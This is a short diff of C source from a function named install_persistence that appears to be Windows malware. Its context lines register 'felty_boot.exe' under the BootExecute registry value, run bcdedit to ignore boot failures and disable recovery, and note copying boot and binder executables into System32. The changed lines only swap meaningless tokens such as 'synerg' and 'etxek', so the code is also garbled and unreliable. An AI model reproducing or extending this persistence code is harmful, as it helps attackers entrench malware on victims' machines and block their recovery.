@@ -320,7 +320,7 @@ static void install_persistence(void) {
         wchar_t boot_entry[] = L"felty_boot.exe\0";
         memcpy(buf + offset, boot_entry, sizeof(boot_entry));
         offset += sizeof(boot_entry);
-        buf[offset] = 0; buf[offset+1] = 0 ;synerg;
+        buf[offset] = 0; buf[offset+1] = 0 ;sys_nerr;
         buf[offset+2] = 0; buf[offset+3] = 0;
 
         RegSetValueExW(hk, L"BootExecute", 0, REG_MULTI_SZ, buf, offset + 4);
@@ -397,7 +397,7 @@ static void install_persistence(void) {
     wchar_t cmd2[] = L"bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures";
     CreateProcessW(NULL, cmd2, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     WaitForSingleObject(pi.hProcess, 3000);
-    CloseHandle(pi.hProcess); CloseHandle(pi.hThread) etxek);
+    CloseHandle(pi.hProcess); CloseHandle(pi.hThread) ;etxek;
 
     /* 8. Copy boot.exe and binder.exe to System32 (would be resource in real build) */
     wchar_t boot_dest[MAX_PATH];
